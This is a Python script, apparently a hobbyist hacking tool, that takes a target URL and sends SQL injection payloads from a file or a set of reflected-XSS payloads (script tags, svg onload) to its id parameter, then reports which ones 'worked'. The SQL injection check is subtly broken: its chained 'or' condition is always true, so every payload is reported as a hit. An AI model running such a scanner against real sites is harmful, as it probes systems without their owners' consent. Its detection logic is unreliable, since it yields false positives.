from requests import get
import sys, os
import time
from platform import uname as name
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
def clear():
    if 'Windows' in name():
        os.system('cls')
        try:from colorama import init
        except:os.system("pip install colorama")
        init()
    elif 'Linux' in name():
        os.system('clear')
clear()
print (f"{lgn} Your target should have [/pages.php?id=] or screw")
url, scann  = input(f"{lrd}[{yw}URL{lrd}]{be} Enter URL Target : {lgn}"), input(f"{lrd}[{yw}MD{lrd}]{be} Enter method scann {lrd}[{pe}sqli :{cn}1 || {pe} xss : {cn}2 {lrd}]:{lgn} ")

def SQLI():
    print(f"""
{pe}
 ## ##    ## ##   ####                ####   
##   ##  ##   ##   ##                  ##    
####     ##   ##   ##                  ##    
 #####   ##   ##   ##                  ##    
    ###  ##   ##   ##                  ##    
##   ##  ##  ##    ##  ##              ##    
 ## ##    ##  ##  ### ###             ####       
       
     {lrd}  github : {lgn}github.com/esfelurm
       
     {lrd}  channel Telegram :{lgn} @esfelurm
       
       {lrd}TARGET : {lgn}{url}
       
       {lrd}METHOD : SQL INJECTION
       
       
    """)
    Payload = open("file/pay.txt", 'r').read().split()
    for i in Payload:
        UR2 = url.split("=")
        UR2 = UR2[0] + '='
        s_ur = UR2 + i
        requ = get(s_ur).text
        if 'FetchRows()' or 'VBScript Runtime' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'You have an error in your SQL syntax' or 'Syntax Error' or 'GetArray()' or 'mysql_fetch_array()' in requ:
            print (f"{cn}--------------------------------")
            print(f"\n\n\n{lgn} ! ! ! {cn}The site has a SQL injection error {lgn}! ! !")
            print(f" {lgn}Payload used : {cn}",i)
            print(f" {lgn} Target link + Payload : {cn}",s_ur)
            print (f"{pe}--------------------------------")
        else:
            pass
def xss():
    print (f"""
{lrd}
:::    :::  ::::::::   ::::::::  
:+:    :+: :+:    :+: :+:    :+: 
 +:+  +:+  +:+        +:+        
{lgn}  +#++:+   +#++:++#++ +#++:++#++ 
 +#+  +#+         +#+        +#+ 
#+#    #+# #+#    #+# #+#    #+# 
###    ###  ########   ########  
        
     """)
    paydone = []
    payloads = ['TESTINGest','/TESTING','//TESTING//','<TESTING','(TESTING','"TESTING','<script>alert("TESTING")</script>', "<sCr'iPt>alert('TESTING')</sCr'iPt>", "</title><sCriPt>alert('TESTING')</sCriPt>","""" "/><script>alert('TESTING')</script>"""]
    URL_TEST = url.split("=")
    URL_TEST = URL_TEST[0] + '='
    for pl in payloads:
        urlte = URL_TEST + pl
        re = get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = URL_TEST + '%27%3ETESTING%3Csvg%2Fonload%3Dconfirm%28%2FTESTING%2F%29%3Eweb'
    sent1 = get(url1).text
    if "'>TESTING<svg/onload=confirm(/TESTING/)>web" in sent1:
        paydone.append('%27%3ETESTING%3Csvg%2Fonload%3Dconfirm%28%2FTESTING%2F%29%3Eweb')
    else:
        pass

    url2 = URL_TEST + '%3Cscript%3Ealert%28%22TESTING%22%29%3C%2Fscript%3E'
    sent2 = get(url2).text
    if '<script>alert("TESTING")</script>' in sent2:
        paydone.append('%3Cscript%3Ealert%28%22TESTING%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = URL_TEST + '%27%3Cscript%3Ealert%28%22TESTING%22%29%3C%2Fscript%3E'
    sent3 = get(url3).text
    if '<script>alert("TESTING")</script>' in sent3:
        paydone.append('%27%3Cscript%3Ealert%28%22TESTING%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print(f"{lrd} You cannot use XSS ! ")
        sys.exit()
    else:
        print(f"{lrd}",len(paydone),f" {lgn}Payloads were found.")
        for p in paydone:
            print(f" {lrd}! ! ! {lgn}Payload found {lrd}! ! !")
            print(f" {lgn}Payload used : {cn}",p), print("{lgn} Target link + Payload : {cn}",URL_TEST+p)

if scann == "1":
	SQLI()
elif scann == "2":
	xss()
else:
    print (" error number")